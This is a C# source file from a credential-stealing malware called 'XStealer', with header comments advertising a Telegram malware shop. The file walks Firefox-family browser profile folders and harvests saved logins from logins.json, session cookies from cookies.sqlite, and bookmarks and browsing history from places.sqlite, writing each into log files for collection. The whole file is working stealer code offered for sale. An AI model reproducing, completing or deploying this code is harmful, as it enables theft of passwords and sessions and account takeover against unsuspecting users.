// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class GEngine
    {
        public static void GetData()
        {
            // Перебираем все назначенные пути для соединения
            foreach (string GeckoPath in GBrowserPaths.GeckoPaths)
            {
                // Соединяем полный путь к браузерам
                string fullPath = string.Concat(GlobalPaths.AppData, GeckoPath) ?? string.Concat(GlobalPaths.LocalAppData, GeckoPath);
                // Проверяем папки на существование
                if (Directory.Exists(fullPath))
                {
                    try
                    {
                        // Проходимся по всем папкам
                        foreach (string gPath in Directory.EnumerateDirectories(fullPath, "*", SearchOption.AllDirectories))
                        {
                            #region Сохранение данных из базы logins.json | Saving data from logins.json database
                            try
                            {
                                IEnumerable<string> filesPasswrds = Directory.EnumerateFiles(gPath, "logins.json", SearchOption.AllDirectories);
                                if (filesPasswrds.Count() > 0)
                                {
                                    foreach (string logins in filesPasswrds)
                                    {      
                                        List<Structures.Password_Gecko> dataPasswd = GDataStruct.ReadDataLogins(gPath, "logins", GBrowserPaths.GetName(logins));
                                        GFormatLog.WritePasswords(dataPasswd, "Passwords.txt"); // $"Gecko_{BrowserPaths.GetName(logins)}.txt"
                                    }
                                }
                            }
                            catch { continue; }
                            #endregion

                            #region Сохранение данных из базы signons.json | Saving data from signons.json database
                            //try
                            //{
                            //    // Переделать путь под старые браузеры
                            //    IEnumerable<string> filesPasswrdsOld = Directory.EnumerateFiles(gPath, "signons.json", SearchOption.AllDirectories);
                            //    if (filesPasswrdsOld.Count() > 0)
                            //    {
                            //        foreach (string logins in filesPasswrdsOld)
                            //        {
                            //            string SavePasswords = GlobalPaths.CombinePath(GlobalPaths.LogPasswords, $"Passwords.txt");
                            //            List<Structures.Password_Gecko> dataPasswd = DataStruct.ReadDataLogins(gPath, "moz_logins", BrowserPaths.GetName(logins));
                            //            FormatLog.WritePasswords(dataPasswd, SavePasswords);
                            //        }
                            //    }
                            //}
                            //catch { continue; }
                            #endregion

                            #region Сохранение данных из базы cookies.sqlite
                            try
                            {
                                IEnumerable<string> filesCookies = Directory.EnumerateFiles(gPath, "cookies.sqlite", SearchOption.AllDirectories);
                                if (filesCookies.Count() > 0)
                                {
                                    foreach (string cookie in filesCookies)
                                    {
                                        List<Structures.Cookies_Gecko> dataCookies = GDataStruct.ReadDataCookies(cookie, "moz_cookies");
                                        GFormatLog.WriteCookies_NetSpace(dataCookies, $"Cookies/Gecko_{GBrowserPaths.GetName(cookie)}.txt");
                                    }
                                }
                            }
                            catch { continue; }
                            #endregion

                            #region Сохранение данных из базы places.sqlite
                            try
                            {
                                IEnumerable<string> filesPlaces = Directory.EnumerateFiles(gPath, "places.sqlite", SearchOption.AllDirectories);
                                if (filesPlaces.Count() > 0)
                                {
                                    foreach (string places in filesPlaces)
                                    {
                                        #region Сохранение закладок
                                        List<Structures.Bookmark_Gecko> dataBook = GDataStruct.ReadDataBookmarks(places, "moz_bookmarks");
                                        GFormatLog.WriteBookmarks(dataBook, $"Bookmarks/Gecko_{GBrowserPaths.GetName(places)}.txt");
                                        #endregion
                                        #region Сохранение истории
                                        List<Structures.History_Gecko> dataHistory = GDataStruct.ReadDataHistory(places, "moz_places");
                                        GFormatLog.WriteHistory(dataHistory, $"Histories/Gecko_{GBrowserPaths.GetName(places)}.txt");
                                        #endregion
                                    }
                                }
                            }
                            catch { continue; }
                            #endregion
                        }
                    }
                    catch { continue; }
                }
            }
        }
    }
}